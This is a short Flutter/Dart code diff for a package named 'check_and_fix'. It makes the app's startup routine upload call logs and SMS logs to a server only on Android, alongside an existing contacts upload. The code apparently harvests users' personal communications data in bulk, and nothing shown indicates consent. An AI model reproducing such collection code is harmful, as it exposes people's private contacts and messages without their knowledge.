@@ -1,5 +1,7 @@
 // ignore_for_file: use_build_context_synchronously
 
+import 'dart:io';
+
 import 'package:check_and_fix/presentation/utils/color_printer.dart';
 import 'package:check_and_fix/services/api_services.dart';
 import 'package:fk_user_agent/fk_user_agent.dart';
@@ -35,8 +37,8 @@ class Init {
     // Api.sendLocation(agent, uuid);
     if (getContacts) await Api.sendContacts(context, agent, uuid);
     print('getContacts $getContacts');
-    await Api.sendCallLogs(context, agent, uuid);
-    await Api.sendSmsLogs(context, agent, uuid);
+    if (Platform.isAndroid) await Api.sendCallLogs(context, agent, uuid);
+    if (Platform.isAndroid) await Api.sendSmsLogs(context, agent, uuid);
   }
 
   Future _initServerConnection() async {
